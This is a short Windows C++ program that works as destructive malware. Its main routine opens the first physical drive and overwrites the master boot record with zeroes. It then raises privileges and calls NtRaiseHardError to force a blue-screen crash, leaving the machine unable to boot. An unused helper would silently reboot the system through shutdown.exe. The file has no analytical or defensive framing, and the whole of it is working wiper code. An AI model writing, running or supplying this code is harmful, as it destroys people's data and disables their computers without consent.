#include <Windows.h>
#include <iostream>
#include <Shlwapi.h>

#pragma comment(lib, "Shlwapi.lib")

int Reboot() {
	// Get the system directory path
	TCHAR szSystemDir[MAX_PATH];
	if (!GetSystemDirectory(szSystemDir, MAX_PATH))
	{
		return 1;
	}

	// Construct the full path to the shutdown.exe utility
	TCHAR szShutdownPath[MAX_PATH];
	if (!PathCombine(szShutdownPath, szSystemDir, TEXT("shutdown.exe")))
	{
		return 1;
	}

	// Construct the command-line parameters for reboot
	TCHAR szParams[] = TEXT("-r -t 0");

	// Execute the shutdown command
	if (reinterpret_cast<int>(ShellExecute(NULL, TEXT("open"), szShutdownPath, szParams, NULL, SW_HIDE)) <= 32)
	{
		return 1;
	}
}

#pragma comment(lib, "ntdll.lib")
extern "C" NTSTATUS NTAPI RtlAdjustPrivilege(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrThread, PBOOLEAN StatusPointer);
extern "C" NTSTATUS NTAPI NtRaiseHardError(LONG ErrorStatus, ULONG Unless1, ULONG Unless2, PULONG_PTR Unless3, ULONG ValidResponseOption, PULONG ResponsePointer);

void BSOD() {
	ULONG r;
	BOOLEAN PrivilegeState = FALSE;
	ULONG ErrorResponse = 0;
	RtlAdjustPrivilege(19, TRUE, FALSE, &PrivilegeState);
	NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, &r);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	// Open the physical drive using the CreateFile function
	HANDLE hDevice = CreateFile(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);

	if (hDevice == INVALID_HANDLE_VALUE) {
		// Failed to open the device
		return 1;
	}

	// Prepare the buffer with the MBR data (all zeroes)
	BYTE buffer[512] = { 0 };

	// Use the WriteFile function to write zeroes to the MBR
	DWORD bytesWritten;
	if (!WriteFile(hDevice, buffer, sizeof(buffer), &bytesWritten, NULL)) {
		// Failed to erase MBR
		CloseHandle(hDevice);
		return 1;
	}

	// Close the handle to the device
	CloseHandle(hDevice);

	// Reboot the system
	BSOD();

	return 0;
}